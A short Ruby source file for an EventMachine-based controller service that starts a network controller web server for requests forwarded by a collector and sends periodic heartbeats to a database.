require 'rcs-common/trace'
require 'rcs-common/systemstatus'

require_relative 'heartbeat'
require_relative 'network_controller'
require_relative 'legacy_network_controller'

require 'eventmachine'

module RCS
  module Controller
    class Events
      include RCS::Tracer

      def check_interval
        Config.instance.global['NC_INTERVAL']
      end

      def setup
        EM.epoll

        EM::run do

          # star the web server that will handle all the requests forwarded by the collector
          NetworkController.start

          # send the first heartbeat to the db, we are alive and want to notify the db immediately
          # subsequent heartbeats will be sent every HB_INTERVAL
          EM.defer { HeartBeat.perform }
          EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { EM.defer { HeartBeat.perform } }
        end
      end
    end
  end
end
